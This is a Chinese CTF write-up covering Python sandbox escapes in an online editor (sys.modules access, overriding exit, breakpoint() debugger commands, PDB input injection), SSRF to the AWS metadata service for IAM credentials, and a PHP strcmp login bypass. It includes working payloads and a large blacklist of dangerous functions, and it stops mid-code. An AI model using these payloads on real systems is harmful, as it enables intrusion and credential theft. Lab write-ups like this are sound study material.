<h1 id="pyeditor">PyEditor</h1>
<p>nb，头回见这么多解的题</p>
<h2 id="题目">题目</h2>
<p>猫猫最近发现了一个在线编辑器，里面似乎有一段没有被正确删除的代码……？</p>
<pre><code class="language-python">import ast
import subprocess
import tempfile
import os
import time
import threading
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import secrets

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024
socketio = SocketIO(app, cors_allowed_origins="*")

active_processes = {}

class PythonRunner:
    
    def __init__(self, code, args=""):
        self.code = code
        self.args = args
        self.process = None
        self.output = []
        self.running = False
        self.temp_file = None
        self.start_time = None
        
    def validate_code(self):
        try:
            if len(self.code) &gt; int(os.environ.get('MAX_CODE_SIZE', 1024)):
                return False, "代码过长"
                
            tree = ast.parse(self.code)
            
            banned_modules = ['os', 'sys', 'subprocess', 'shlex', 'pty', 'popen', 'shutil', 'platform', 'ctypes', 'cffi', 'io', 'importlib']
            
            banned_functions = ['eval', 'exec', 'compile', 'input', '__import__', 'open', 'file', 'execfile', 'reload']
            
            banned_methods = ['system', 'popen', 'spawn', 'execv', 'execl', 'execve', 'execlp', 'execvp', 'chdir', 'kill', 'remove', 'unlink', 'rmdir', 'mkdir', 'makedirs', 'removedirs', 'read', 'write', 'readlines', 'writelines', 'load', 'loads', 'dump', 'dumps', 'get_data', 'get_source', 'get_code', 'load_module', 'exec_module']
            
            dangerous_attributes = ['__class__', '__base__', '__bases__', '__mro__', '__subclasses__', '__globals__', '__builtins__', '__getattribute__', '__getattr__', '__setattr__', '__delattr__', '__call__']
            
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for name in node.names:
                        if name.name in banned_modules:
                            return False, f"禁止导入模块: {name.name}"
                        
                elif isinstance(node, ast.ImportFrom):
                    if node.module in banned_modules:
                        return False, f"禁止从模块导入: {node.module}"
                
                elif isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name):
                        if node.func.id in banned_functions:
                            return False, f"禁止调用函数: {node.func.id}"
                    
                    elif isinstance(node.func, ast.Attribute):
                        if node.func.attr in banned_methods:
                            return False, f"禁止调用方法: {node.func.attr}"
                    
                    elif isinstance(node.func, ast.Name):
                        if node.func.id == 'open':
                            return False, "禁止文件操作"
                
                elif isinstance(node, ast.With):
                    for item in node.items:
                        if isinstance(item.context_expr, ast.Call):
                            if isinstance(item.context_expr.func, ast.Name):
                                if item.context_expr.func.id == 'open':
                                    return False, "禁止文件操作"
                
                elif isinstance(node, ast.Attribute):
                    if node.attr in dangerous_attributes:
                        if isinstance(node.value, ast.Call) or isinstance(node.value, ast.Name):
                            return False, f"禁止访问危险属性: {node.attr}"
                
                elif isinstance(node, ast.Subscript):
                    if isinstance(node.value, ast.Attribute):
                        if node.value.attr == '__subclasses__':
                            return False, "禁止访问__subclasses__"
            
            return True, "代码验证通过"
            
        except SyntaxError as e:
            return False, f"语法错误: {str(e)}"
        except Exception as e:
            return False, f"验证错误: {str(e)}"
    
    def create_script(self):
        try:
            self.temp_file = tempfile.NamedTemporaryFile(
                mode='w', 
                suffix='.py', 
                dir='/tmp',
                delete=False
            )
            
            wrapper = """
import sys

def safe_exec():
    try:
{indented_code}
        return 0
    except SystemExit as e:
        return e.code if isinstance(e.code, int) else 0
    except Exception as e:
        print(f"执行错误: {{e}}", file=sys.stderr)
        return 1

sys.argv = ['sandbox.py'] + {args}

exit_code = safe_exec()

exit()
# Hey bro, don't forget to remove this before release!!!
import os
import sys

flag_content = os.environ.get('GZCTF_FLAG', '')
os.environ['GZCTF_FLAG'] = ''

try:
    with open('/flag.txt', 'w') as f:
        f.write(flag_content)
except:
    pass
"""
            
            indented_code = '\n'.join(['        ' + line for line in self.code.split('\n')])
            
            full_code = wrapper.format(
                indented_code=indented_code,
                args=str(self.args.split() if self.args else [])
            )
            
            self.temp_file.write(full_code)
            self.temp_file.flush()
            os.chmod(self.temp_file.name, 0o755)
            
            return self.temp_file.name
            
        except Exception as e:
            raise Exception(f"创建脚本失败: {str(e)}")
    
    def run(self):
        try:
            is_valid, message = self.validate_code()
            if not is_valid:
                self.output.append(f"验证失败: {message}")
                return False
                
            script_path = self.create_script()
            
            cmd = ['python', script_path]
            if self.args:
                cmd.extend(self.args.split())
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            self.running = True
            self.start_time = time.time()
            
            def read_output():
                while self.process and self.process.poll() is None:
                    try:
                        line = self.process.stdout.readline()
                        if line:
                            self.output.append(line.strip())
                            socketio.emit('output', {'data': line})
                    except:
                        break
                
                stdout, stderr = self.process.communicate()
                if stdout:
                    for line in stdout.split('\n'):
                        if line.strip():
                            self.output.append(line.strip())
                            socketio.emit('output', {'data': line})
                if stderr:
                    for line in stderr.split('\n'):
                        if line.strip():
                            self.output.append(f"错误: {line.strip()}")
                            socketio.emit('output', {'data': f"错误: {line}"})
                
                self.running = False
                socketio.emit('process_end', {'pid': self.process.pid})
            
            thread = threading.Thread(target=read_output)
            thread.daemon = True
            thread.start()
            
            return True
            
        except Exception as e:
            self.output.append(f"运行失败: {str(e)}")
            return False
    
    def send_input(self, data):
        if self.process and self.process.poll() is None:
            try:
                self.process.stdin.write(data + '\n')
                self.process.stdin.flush()
                return True
            except:
                return False
        return False
    
    def terminate(self):
        if self.process and self.process.poll() is None:
            self.process.terminate()
            self.process.wait(timeout=5)
            self.running = False
            
            if self.temp_file:
                try:
                    os.unlink(self.temp_file.name)
                except:
                    pass
            return True
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/run', methods=['POST'])
def run_code():
    data = request.json
    code = data.get('code', '')
    args = data.get('args', '')
    
    runner = PythonRunner(code, args)
    
    pid = secrets.token_hex(8)
    active_processes[pid] = runner
    
    success = runner.run()
    
    if success:
        return jsonify({
            'success': True,
            'pid': pid,
            'message': '进程已启动'
        })
    else:
        return jsonify({
            'success': False,
            'message': '启动失败'
        })

@app.route('/api/terminate', methods=['POST'])
def terminate_process():
    data = request.json
    pid = data.get('pid')
    
    if pid in active_processes:
        active_processes[pid].terminate()
        del active_processes[pid]
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': '进程不存在'})

@app.route('/api/send_input', methods=['POST'])
def send_input():
    data = request.json
    pid = data.get('pid')
    input_data = data.get('input', '')
    
    if pid in active_processes:
        success = active_processes[pid].send_input(input_data)
        return jsonify({'success': success})
    
    return jsonify({'success': False})

@socketio.on('connect')
def handle_connect():
    emit('connected', {'data': 'Connected'})

@socketio.on('disconnect')
def handle_disconnect():
    pass

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314133217587.png" alt="image-20260314133217365" loading="lazy"></p>
<h2 id="解">解</h2>
<h3 id="法一sysmoudles">法一(sys.moudles)：</h3>
<p>代码审计发现模块函数方法文件操作都有些被ban了</p>
<pre><code class="language-python"># Hey bro, don't forget to remove this before release!!!
import os
import sys

flag_content = os.environ.get('GZCTF_FLAG', '')
os.environ['GZCTF_FLAG'] = ''

try:
    with open('/flag.txt', 'w') as f:
        f.write(flag_content)
except:
    pass
</code></pre>
<p>由此得知flag可能在环境变量或/flag.txt中</p>
<p>发现源代码的过滤不是很严格，他的过滤使用的是</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314140201212.png" alt="image-20260314140201144" loading="lazy"></p>
<p>只有对ast.Import一类写法的限制</p>
<p>也就是不能写 <code>import os</code>和 <code>os.system</code></p>
<p>但是可以<code>__import__("os").system("calc")</code></p>
<p>也就是说我们可以使用已存在的方式构造</p>
<p>学习下Python的模块导入机制：</p>
<p>在 Python 中，解释器启动或者运行某些初始化脚本时，往往需要用到 <code>os</code> 或 <code>sys</code> 模块。 当一个模块被导入过一次后，Python 会把它缓存在一个全局字典里：<strong><code>sys.modules</code></strong>。</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314133623384.png" alt="图片" loading="lazy"></p>
<p>搜索也可得知，sys.modules是模块缓存字典，我们首先确认一下sys能不能使用，使用以下代码</p>
<pre><code class="language-python">print(sys)
</code></pre>
<p>没回显也没报错</p>
<p>打印所有已加载模块的名称列表</p>
<pre><code class="language-python">print(list(sys.modules.keys()))
</code></pre>
<pre><code>['sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', '__main__', '_abc', 'abc', '_stat', 'stat', '_collections_abc', 'errno', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'site']
</code></pre>
<p>我们发现有os模块，尝试打印环境变量，输入以下代码</p>
<pre><code>print(sys.modules['os'].environ)
</code></pre>
<pre><code>environ({'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'HOSTNAME': '0c3adc909bc3', 'GZCTF_FLAG': 'furryCTF{D0_N0t_For9e7_t0_rem0V3_d3bu9_wHEn_ade51c346631_re1e4s3}', 'GZCTF_TEAM_ID': '747', 'PYTHON_VERSION': '3.14.2', 'PYTHON_SHA256': 'ce543ab854bc256b61b71e9b27f831ffd1bfd60a479d639f8be7f9757cf573e9', 'HOME': '/root', 'LC_CTYPE': 'C.UTF-8', 'WERKZEUG_SERVER_FD': '3'})
</code></pre>
<p>拿到flag</p>
<h3 id="法二builtins修改代码">法二(builtins修改代码)：</h3>
<pre><code class="language-py">exit()
# Hey bro, don't forget to remove this before release!!!
import os
import sys

flag_content = os.environ.get('GZCTF_FLAG', '')
os.environ['GZCTF_FLAG'] = ''

try:
    with open('/flag.txt', 'w') as f:
        f.write(flag_content)
except:
    pass
"""
</code></pre>
<p>我们注意到后面部分代码不被执行是因为前面有<code>exit()</code></p>
<p>我们可以尝试使其失效</p>
<pre><code class="language-py">import builtins

# 让 wrapper 的 exit() 失效
builtins.exit = lambda *a, **k: None
#或者
#__builtins__.exit = lambda: None

f = builtins.open('/flag.txt', 'r')
for line in f:
    print(line, end='')
f.close()
</code></pre>
<p>ok</p>
<h3 id="法三python31breakpoint新参数">法三(python3.1breakpoint新参数)：</h3>
<p>看到默认程序<code>print("Hello Python 3.14!")</code></p>
<p>Python3.14中breakpoint()有一个新特性，他支持了一个新参数：commands</p>
<p>这个参数允许你传入一个命令列表，当breakpoint()开始执行时，他将会自动依次传入操作命令（这相当于一个调试器，n代表next，j代表jump，p代表print）</p>
<p>我们需要利用jump命令跳过exit()，但是jump只能在同一代码块下进行，所以我们首先需要从safe_exec()函数返回，并尝试着找到exit()的位置</p>
<pre><code class="language-py">def safe_exec():
    try:
{indented_code}
        return 0
    except SystemExit as e:
        return e.code if isinstance(e.code, int) else 0
    except Exception as e:
        print(f"执行错误: {{e}}", file=sys.stderr)
        return 1

sys.argv = ['sandbox.py'] + {args}

exit_code = safe_exec()

exit()
</code></pre>
<p>不方便看的话就挨个试，最后确定需要3个</p>
<pre><code>breakpoint(commands=['n']*3)
</code></pre>
<p>回显exit()</p>
<pre><code>breakpoint(commands=['n']*3+['j 20'])
</code></pre>
<p>回显import os</p>
<p>再往下执行3行，flag就被赋值到变量中，然后读取</p>
<pre><code class="language-python">breakpoint(commands=['n']*3+['j 20']+['n']*3+['p flag_content'])
# 或者
breakpoint(commands=['n','n','n','j 20','n','n','n','p flag_content'])
</code></pre>
<h3 id="法四全角绕过">法四(全角绕过)：</h3>
<pre><code class="language-Python">g = [ｇｌｏｂａｌｓ][0]()
print(g['flag_content'])
</code></pre>
<p>这啥啊，也跑不出来啊</p>

<h1 id="ccpreview">CCPreview</h1>
<h2 id="题目-1">题目</h2>
<p>为了测试内网服务的连通性，【数据删除】开发组上线了一个简单的网页预览工具。<br>
据说该服务部署在 AWS 也就是亚马逊云服务上，属于EC2实例……<br>
虽然它看起来只是一个简单的 curl 代理.jpg<br>
“话说，咱们就这么部署在这里，真的没问题吗……”<br>
“怕啥，这就一个curl，能有什么漏洞？”</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314150558170.png" alt="image-20260314150558073" loading="lazy"></p>
<h2 id="解-1">解</h2>
<p>像SSRF</p>
<p>访问<code>http://169.254.169.254/latest/meta-data/</code>（固定打法，积累下）</p>
<pre><code class="language-回显">iam/
network/
public-hostname/
</code></pre>
<p>iam和权限凭证有关</p>
<pre><code>http://169.254.169.254/latest/meta-data/iam
</code></pre>
<pre><code class="language-回显">security-credentials/
</code></pre>
<p>security-credentials和安全凭证有关</p>
<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/
</code></pre>
<p>返回的是角色名称</p>
<pre><code>admin-role
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314151243910.png" alt="image-20260314151243819" loading="lazy"></p>
<h1 id="猫猫最后的复仇">猫猫最后的复仇</h1>
<h2 id="题目-2">题目</h2>
<p>这次猫猫长记性了，把多余的代码给移除了。<br>
但是猫猫很不服气，他觉得只要把环境变量清空，你们就不可能拿到flag。<br>
为此他甚至升级了一下他的AST分析和黑名单替换，ban掉了import。<br>
哼哼唧唧！<br>
不信你们还能绕过呜呜呜~</p>
<blockquote>
<p>本题可以看成PyEditor的DLC<br>
好消息是依旧存在一种思路可以同时拿到本题和PyEditor的分数<br>
（也就是相当于PyEditor荣升1100分,IN+难度）<br>
坏消息是，真的有人能找到这种思路吗？<br>
求求有人写个预期解吧呜呜呜呜</p>
</blockquote>
<pre><code class="language-python">import ast
import subprocess
import tempfile
import os
import time
import threading
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import secrets

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024
socketio = SocketIO(app, cors_allowed_origins="*")

active_processes = {}

banned = ['os','sys','subprocess','shlex','pty','popen','shutil','platform','ctypes','cffi','io','importlib','linecache','inspect','builtins',\
        'yaml','fcntl','functools','itertools','operator','readline','getpass','pprint','pipes','pathlib','pdb','Path','codecs','fileinput',\
        'mmap','runpy','difflib','tempfile','glob','gc','threading','multiprocessing','dis','logging','_thread','atexit','urllib','request',\
        'self','modules','help','warnings','pydoc','load_module','object','bytes','weakref','reprlib','encode','future','uuid','multi','posix',\
        'CGIHTTPServer','cgitb','compileall','dircache','doctest', 'dumbdbm', 'filecmp','ftplib','gzip','getopt','gettext','httplib','popen2',\
        'imputil','macpath','mailbox','mailcap','mhlib','mimetools','mimetypes','modulefinder','netrc','new','optparse','SimpleHTTPServer',\
        'posixfile','profile','pstats','py_compile','pyclbr','rexec','SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',\
        'sysconfig', 'tabnanny', 'tarfile', 'telnetlib','Tix', 'trace', 'turtle', 'urllib', 'urllib2','user', 'uu', 'webbrowser', 'whichdb',\
        'zipfile', 'zipimport','eval','exec','compile','input','__import__','open','file','execfile','reload','globals','items','keys',\
         'values','getline','getlines','isinstance','__build_class__','help','type','super','getattr','setattr','vars','property',\
        'staticmethod','classmethod','dir','object','read_text','__subclasses__','fileno','get_data','locals','get','_current_frames',\
        'f_locals','f_globals','f_back','settrace','setprofile','tb_frame','__traceback__','tb_next','_getframe','f_code','co_consts',\
        'co_names','basicConfig','get_objects','startswith','dumps','request','urlopen','response','get_content','decode','self',\
        'modules','environ','breakpointhook','set_trace','interaction','gi_frame','stdout','stderr','stdin','StringIO','fork_exec',\
        'path','_Printer__filenames','system','popen','spawn','execv','execl','execve','execlp','execvp','chdir','kill','remove','unlink','rmdir','mkdir','makedirs',\
        'removedirs','read','write','readlines','writelines','load','loads','dump','dumps','get_data','get_source','get_code','load_module',\
        'exec_module','items','keys','values','getline','getlines','__globals__','__dict__','__build_class__','help','type','super',\
        'getattr','setattr','vars','property','staticmethod','classmethod','dir','object','read_text','__subclasses__','__bases__',\
        '__class__','fileno','ACCESS_READ','locals','get','_current_frames','f_locals','f_globals','f_back','settrace','setprofile',\
        'tb_frame','__traceback__','tb_next','_getframe','f_code','co_consts','co_names','basicConfig','get_objects','interaction',\
        'startswith','request','urlopen','response','get_content','decode','self','modules','environ','breakpointhook','set_trace',\
        'gi_frame','stdout','stderr','stdin','StringIO','reload','fork_exec','path','_Printer__filenames','__class__','__base__','__bases__',\
        '__mro__','__subclasses__','__globals__','__builtins__','__getattribute__','__getattr__','__setattr__','__delattr__','__call__',\
        '__dict__','__reduce_ex__','__getitem__','__loader__','__doc__','__weakref__','__enter__','__exit__','__sub__','__mul__',\
        '__floordiv__','__truediv__','__mod__','__pow__','__lt__','__le__','__eq__','__ne__','__ge__','__gt__','__iadd__','__isub__',\
        '__imul__','__ifloordiv__','__idiv__','__itruediv__','__future__','__imod__','__ipow__','__ilshift__','__irshift__','__iand__',\
        '__ior__','__ixor__','.txt','txt','ag.txt','ag.t','g.t','__main__','__prepare__','__init_subclass__','currentframe','cmd','shell','bash',\
        'import','@','__name__']

def remove_non_ascii(text: str) -&gt; str:
    return ''.join(char for char in text if ord(char) &lt; 128)

class PythonRunner:

    def __init__(self, code, args=""):
        self.code = code
        self.args = args
        self.process = None
        self.output = []
        self.running = False
        self.temp_file = None
        self.start_time = None

    def extract_names(self, node):
        names = []
        while True:
            if isinstance(node, ast.Attribute):
                names.append(node.attr)
                node = node.value
            elif isinstance(node, ast.Call):
                node = node.func
            elif isinstance(node, ast.Subscript):
                node = node.value
            elif isinstance(node, ast.Name):
                names.append(node.id)
                break
            else:
                break
        return list(reversed(names))

    def validate_code(self):
        try:
            if len(self.code) &gt; int(os.environ.get('MAX_CODE_SIZE', 1024)):
                return False, "代码过长"

            tree = ast.parse(self.code)

            banned_modules = ['os','sys','subprocess','shlex','pty','popen','shutil','platform','ctypes','cffi','io','importlib','linecache','inspect','builtins',\
                              'yaml','fcntl','functools','itertools','operator','readline','getpass','pprint','pipes','pathlib','pdb','Path','codecs','fileinput',\
                            'mmap','runpy','difflib','tempfile','glob','gc','threading','multiprocessing','dis','logging','_thread','atexit','urllib','request',\
                            'self','modules','help','warnings','pydoc','load_module','object','bytes','weakref','reprlib','encode','future','uuid','multi','posix',\
                            'CGIHTTPServer','cgitb','compileall','dircache','doctest', 'dumbdbm', 'filecmp','ftplib','gzip','getopt','gettext','httplib','popen2',\
                            'imputil','macpath','mailbox','mailcap','mhlib','mimetools','mimetypes','modulefinder','netrc','new','optparse','SimpleHTTPServer',\
                            'posixfile','profile','pstats','py_compile','pyclbr','rexec','SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',\
                            'sysconfig', 'tabnanny', 'tarfile', 'telnetlib','Tix', 'trace', 'turtle', 'urllib', 'urllib2','user', 'uu', 'webbrowser', 'whichdb',\
                            'zipfile', 'zipimport','__main__','__prepare__','__init_subclass__','currentframe','timeit']

            banned_functions = ['eval','exec','compile','input','__import__','open','file','execfile','reload','globals','items','keys','values','getline',\
                                'getlines','isinstance','__build_class__','help','type','super','getattr','setattr','vars','property','staticmethod',\
                                'classmethod','dir','object','read_text','__subclasses__','fileno','get_data','locals','get','_current_frames','f_locals',\
                                'f_globals','f_back','settrace','setprofile','tb_frame','__traceback__','tb_next','_getframe','f_code','co_consts',\
                                'co_names','basicConfig','get_objects','startswith','dumps','request','urlopen','response','get_content','decode','self',\
                                'modules','environ','breakpointhook','set_trace','interaction','gi_frame','stdout','stderr','stdin','StringIO','fork_exec',\
                                'path','_Printer__filenames','f','__main__','__prepare__','__init_subclass__','currentframe','timeit']

            banned_methods = ['system','popen','spawn','execv','execl','execve','execlp','execvp','chdir','kill','remove','unlink','rmdir','mkdir','makedirs',\
                              'removedirs','read','write','readlines','writelines','load','loads','dump','dumps','get_data','get_source','get_code','load_module',\
                            'exec_module','items','keys','values','getline','getlines','__globals__','__dict__','__build_class__','help','type','super',\
                            'getattr','setattr','vars','property','staticmethod','classmethod','dir','object','read_text','__subclasses__','__bases__',\
                            '__class__','fileno','ACCESS_READ','locals','get','_current_frames','f_locals','f_globals','f_back','settrace','setprofile',\
                            'tb_frame','__traceback__','tb_next','_getframe','f_code','co_consts','co_names','basicConfig','get_objects','interaction',\
                            'startswith','request','urlopen','response','get_content','decode','self','modules','environ','breakpointhook','set_trace',\
                            'gi_frame','stdout','stderr','stdin','StringIO','reload','fork_exec','path','_Printer__filenames','f','__main__','__prepare__',\
                            '__init_subclass__','currentframe','timeit']

            dangerous_attributes = ['__class__','__base__','__bases__','__mro__','__subclasses__','__globals__','__builtins__','__getattribute__',\
                                    '__getattr__','__setattr__','__delattr__','__call__','__dict__','__reduce_ex__','__getitem__','__loader__',\
                                    '__doc__','__weakref__','__enter__','__exit__','__sub__','__mul__','__floordiv__','__truediv__','__mod__',\
                                    '__pow__','__lt__','__le__','__eq__','__ne__','__ge__','__gt__','__iadd__','__isub__','__imul__','__ifloordiv__',\
                                    '__idiv__','__itruediv__','__future__','__imod__','__ipow__','__ilshift__','__irshift__','__iand__','__ior__',\
                                    '__ixor__','__main__','__prepare__','__init_subclass__','__name__']

            banned_functions += banned_modules + dangerous_attributes
            banned_methods += banned_modules + dangerous_attributes

            for node in ast.walk(tree):

                if isinstance(node, ast.Import):
                    for name in node.names:
                        if name.name.split('.')[0] in banned_modules:
                            return False, f"禁止导入模块: {name.name}"

                elif isinstance(node, ast.ImportFrom):
                    if node.module and node.module.split('.')[0] in banned_modules:
                        return False, f"禁止从模块导入: {node.module}"

                elif isinstance(node, ast.Call):
                    chain = self.extract_names(node)
                    for name in chain:
                        if name in banned_functions or name in banned_methods:
                            return False, f"禁止调用: {name}"

                elif isinstance(node, ast.Attribute):
                    chain = self.extract_names(node)
                    for name in chain:
                        if name in dangerous_attributes:
                            return False, f"禁止访问危险属性: {name}"

                elif isinstance(node, ast.Subscript):
                    chain = self.extract_names(node)
                    if '__subclasses__' in chain:
                        return False, "禁止访问__subclasses__"

                elif isinstance(node, ast.With):
                    for item in node.items:
                        if isinstance(item.context_expr, ast.Call):
                            chain = self.extract_names(item.context_expr)
                            if 'open' in chain:
                                return False, "禁止文件操作"

            return True, "代码验证通过"

        except SyntaxError as e:
            return False, f"语法错误: {str(e)}"
        except Exception as e:
            return False, f"验证错误: {str(e)}"

    def create_script(self):
        try:
            self.temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', dir='/tmp', delete=False)

            wrapper = """
import sys
import os
if(os.environ.get('GZCTF_FLAG', '')!=''):
    flag_content = os.environ.get('GZCTF_FLAG', '')
    try:
        with open('/flag.txt', 'w') as f:
            f.write(flag_content)
    except:
        pass
else:
    with open('/flag.txt', 'r') as f:
        flag_content=f.read()
os.environ['GZCTF_FLAG'] = ''
def safe_exec():
    try:
        flag_content = ""
{indented_code}
        return 0
    except SystemExit as e:
        return e.code if isinstance(e.code, int) else 0
    except Exception as e:
        print(f"执行错误: {{e}}", file=sys.stderr)
        return 1

sys.argv = ['sandbox.py']
exit_code = safe_exec()
exit()
"""
            indented_code = '\n'.join(['        ' + line for line in self.code.split('\n')]).replace('flag.txt','').replace("GZCTF_FLAG","").replace("@","")
            while True:
                save_code = indented_code
                indented_code = remove_non_ascii(indented_code).replace('flag.txt','').replace("GZCTF_FLAG","").replace("@","")
                for _ in banned:
                    indented_code = indented_code.replace(_,"")
                if(save_code==indented_code):
                    break
            self.temp_file.write(wrapper.format(indented_code=indented_code))
            self.temp_file.flush()
            os.chmod(self.temp_file.name, 0o755)
            return self.temp_file.name

        except Exception as e:
            raise Exception(f"创建脚本失败: {str(e)}")

    def run(self):
        try:
            is_valid, message = self.validate_code()
            if not is_valid:
                self.output.append(f"验证失败: {message}")
                return False

            script_path = self.create_script()
            cmd = ['python', script_path]
            if self.args:
                cmd.extend(self.args.split())

            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True, bufsize=1, universal_newlines=True)
            self.running = True
            self.start_time = time.time()

            def read_output():
                while self.process and self.process.poll() is None:
                    try:
                        line = self.process.stdout.readline()
                        if line:
                            socketio.emit('output', {'data': line})
                    except:
                        break

                stdout, stderr = self.process.communicate()
                if stdout:
                    socketio.emit('output', {'data': stdout})
                if stderr:
                    socketio.emit('output', {'data': stderr})
                socketio.emit('process_end', {'pid': self.process.pid})

            threading.Thread(target=read_output, daemon=True).start()
            return True

        except Exception as e:
            self.output.append(f"运行失败: {str(e)}")
            return False

    def send_input(self, data):
        if self.process and self.process.poll() is None:
            try:
                self.process.stdin.write(data + '\n')
                self.process.stdin.flush()
                return True
            except:
                return False
        return False

    def terminate(self):
        if self.process and self.process.poll() is None:
            self.process.terminate()
            self.process.wait(timeout=5)
            self.running = False
            if self.temp_file:
                try:
                    os.unlink(self.temp_file.name)
                except:
                    pass
            return True
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/run', methods=['POST'])
def run_code():
    data = request.json
    code = data.get('code', '')
    args = data.get('args', '')
    runner = PythonRunner(code, args)
    pid = secrets.token_hex(8)
    active_processes[pid] = runner
    success = runner.run()
    if success:
        return jsonify({'success': True,'pid': pid,'message': '进程已启动'})
    else:
        return jsonify({'success': False,'message': '启动失败'})

@app.route('/api/terminate', methods=['POST'])
def terminate_process():
    data = request.json
    pid = data.get('pid')
    if pid in active_processes:
        active_processes[pid].terminate()
        del active_processes[pid]
        return jsonify({'success': True})
    return jsonify({'success': False,'message': '进程不存在'})

@app.route('/api/send_input', methods=['POST'])
def send_input():
    data = request.json
    pid = data.get('pid')
    input_data = data.get('input', '')
    if pid in active_processes:
        success = active_processes[pid].send_input(input_data)
        return jsonify({'success': success})
    return jsonify({'success': False})

@socketio.on('connect')
def handle_connect():
    emit('connected', {'data': 'Connected'})

@socketio.on('disconnect')
def handle_disconnect():
    pass

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)

</code></pre>
<h2 id="解-2">解</h2>
<h3 id="法一">法一：</h3>
<p>依旧可以通过利用python3.1breakpoint新参数拿flag</p>
<h3 id="法二">法二：</h3>
<p>核心原理</p>
<blockquote>
<p>黑名单遗漏：附件源码后端 app.py 虽然过滤了 os、exec、import 等大量危险关键词，但遗漏了 Python 3.7+ 的内置函数 breakpoint()。</p>
<p>交互式执行：breakpoint() 会启动 PDB 调试器，该调试器允许用户通过标准输入（stdin）执行任意 Python 代码。</p>
<p>输入未过滤：后端仅对提交的“源代码”进行了严格过滤，但对运行期间通过 /api/send_input 接口传入的“标准输入”没有任何检测。</p>
</blockquote>
<p><strong>攻击链</strong>：提交 <code>breakpoint()</code> 绕过静态检查 -&gt; 进入 PDB 调试模式 -&gt; 通过 API 发送恶意 Payload -&gt; PDB 执行 Payload 读取 Flag。</p>
<pre><code>breakpoint()
</code></pre>
<p>f12控制台</p>
<pre><code>var pid =&nbsp;"006a70be9a47f554";
fetch('/api/send_input', {
&nbsp; &nbsp; method:&nbsp;'POST',
&nbsp; &nbsp; headers: {'Content-Type':&nbsp;'application/json'},
&nbsp; &nbsp; body: JSON.stringify({
&nbsp; &nbsp; &nbsp; &nbsp; pid: pid,
&nbsp; &nbsp; &nbsp; &nbsp; input:&nbsp;"print(open('/flag.txt').read())"
&nbsp; &nbsp; })
});
</code></pre>
<p>拿到flag</p>
<p>其实就是POST请求，burp抓包发送下面的内容也可以</p>
<pre><code>{
    "pid": "006a70be9a47f554",
    "input": "print(open('/flag.txt').read())"
}
</code></pre>
<h1 id="sso-drive">SSO Drive</h1>
<p>其实最想学习的是这道，有很多新知识</p>
<h2 id="题目-3">题目</h2>
<p>身为红队的你发现，自己渗透的蓝方目标中似乎刚刚上线了一个新的目标：内部云盘。<br>
大概是蓝方的安全团队确信他们已经修复了所有逻辑漏洞，这里已经不会出问题了。<br>
而且，看起来他们为了以防万一，部署了一套极为严格的文件上传审查策略。<br>
也正是如此，他们才敢如此大胆的就把这个云盘暴露出来。</p>
<p>好在，通过对其他资产目标的社工，你得知了这样两个情报：</p>
<blockquote>
<p>1.负责认证模块的开发小哥有着随手备份源码的好习惯，虽然从蓝方聊天平台泄露出来的消息来看，他似乎发誓说新的密码校验逻辑是无懈可击的？<br>
2.蓝方运维团队泄露的内部公告指出，为了兼容旧系统，他们不得不在服务器后台运行了一个陈旧服务用于内部远程管理。</p>
</blockquote>
<p>flag3在/root里</p>

<h2 id="解-3">解</h2>
<p>看到“有备份源码的习惯”就知道要dirsearch了</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260314154023259.png" alt="image-20260314154023159" loading="lazy"></p>
<p>下载源码</p>
<p>db.sql</p>
<pre><code class="language-sql">CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL
);
INSERT INTO users (username, password) VALUES ('admin', 'placeholder');
</code></pre>
<p>index.php.bak</p>
<pre><code class="language-php">&lt;?php
// Backup 2026-01-20 by Dev Team
// TODO: Fix the comparison logic later?
session_start();
$REAL_PASSWORD = 'THIS_IS_A_VERY_LONG_RANDOM_PASSWORD_THAT_CANNOT_BE_BRUTEFORCED_882193712';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $u = $_POST['username'];
    $p = $_POST['password'];
    if ($u === 'admin') {
        // Dev Note: using strcmp for binary safe comparison
        if (strcmp($p, $REAL_PASSWORD) == 0) {
            $_SESSION['is_admin'] = true;
            header("Location: dashboard.php");
            exit;
        } else {
